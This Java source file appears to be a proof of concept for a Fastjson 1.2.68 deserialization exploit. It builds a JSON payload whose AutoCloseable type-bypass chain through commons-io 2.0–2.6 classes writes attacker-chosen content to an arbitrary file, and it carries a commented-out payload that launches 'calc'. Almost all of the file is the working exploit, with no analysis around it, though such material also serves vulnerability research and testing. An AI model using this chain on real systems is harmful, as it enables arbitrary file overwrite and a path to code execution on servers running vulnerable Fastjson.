package payloads;

import com.alibaba.fastjson.JSON;

public class Fastjson1_2_68 {
    public static void main(String[] args) {
//        String payload = "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"payloads.VulAutoCloseable\",\"cmd\":\"calc\"}";

        //commons-io 2.0 - 2.6 版本：
        String code = "FLAG{THIS_IS_A_flAT_THAT_You_REALLY_waNT!!!}";
        int length = code.length();
        for (int i = 0; i <= 8192 - length ; i++) {
            code += " ";
        }
        String payload = "{\n" +
                "  \"x\":{\n" +
                "    \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
                "    \"input\":{\n" +
                "      \"@type\":\"java.lang.AutoCloseable\",\n" +
                "      \"@type\":\"org.apache.commons.io.input.ReaderInputStream\",\n" +
                "      \"reader\":{\n" +
                "        \"@type\":\"org.apache.commons.io.input.CharSequenceReader\",\n" +
                "        \"charSequence\":{\"@type\":\"java.lang.String\"\"" + code +"\"\n" +
                "      },\n" +
                "      \"charsetName\":\"UTF-8\",\n" +
                "      \"bufferSize\":1024\n" +
                "    },\n" +
                "    \"branch\":{\n" +
                "      \"@type\":\"java.lang.AutoCloseable\",\n" +
                "      \"@type\":\"org.apache.commons.io.output.WriterOutputStream\",\n" +
                "      \"writer\":{\n" +
                "        \"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\",\n" +
                "        \"file\":\"e:/flag.txt\",\n" +
                "        \"encoding\":\"UTF-8\",\n" +
                "        \"append\": false\n" +
                "      },\n" +
                "      \"charsetName\":\"UTF-8\",\n" +
                "      \"bufferSize\": 1024,\n" +
                "      \"writeImmediately\": true\n" +
                "    },\n" +
                "    \"trigger\":{\n" +
                "      \"@type\":\"java.lang.AutoCloseable\",\n" +
                "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
                "      \"is\":{\n" +
                "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
                "        \"input\":{\n" +
                "          \"$ref\":\"$.input\"\n" +
                "        },\n" +
                "        \"branch\":{\n" +
                "          \"$ref\":\"$.branch\"\n" +
                "        },\n" +
                "        \"closeBranch\": true\n" +
                "      },\n" +
                "      \"httpContentType\":\"text/xml\",\n" +
                "      \"lenient\":false,\n" +
                "      \"defaultEncoding\":\"UTF-8\"\n" +
                "    },\n" +
                "    \"trigger2\":{\n" +
                "      \"@type\":\"java.lang.AutoCloseable\",\n" +
                "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
                "      \"is\":{\n" +
                "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
                "        \"input\":{\n" +
                "          \"$ref\":\"$.input\"\n" +
                "        },\n" +
                "        \"branch\":{\n" +
                "          \"$ref\":\"$.branch\"\n" +
                "        },\n" +
                "        \"closeBranch\": true\n" +
                "      },\n" +
                "      \"httpContentType\":\"text/xml\",\n" +
                "      \"lenient\":false,\n" +
                "      \"defaultEncoding\":\"UTF-8\"\n" +
                "    },\n" +
                "    \"trigger3\":{\n" +
                "      \"@type\":\"java.lang.AutoCloseable\",\n" +
                "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
                "      \"is\":{\n" +
                "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
                "        \"input\":{\n" +
                "          \"$ref\":\"$.input\"\n" +
                "        },\n" +
                "        \"branch\":{\n" +
                "          \"$ref\":\"$.branch\"\n" +
                "        },\n" +
                "        \"closeBranch\": true\n" +
                "      },\n" +
                "      \"httpContentType\":\"text/xml\",\n" +
                "      \"lenient\":false,\n" +
                "      \"defaultEncoding\":\"UTF-8\"\n" +
                "    }\n" +
                "  }\n" +
                "}";
        System.out.println(payload);
//        JSON.parseObject(payload);
        JSON.parse(payload);
    }
}
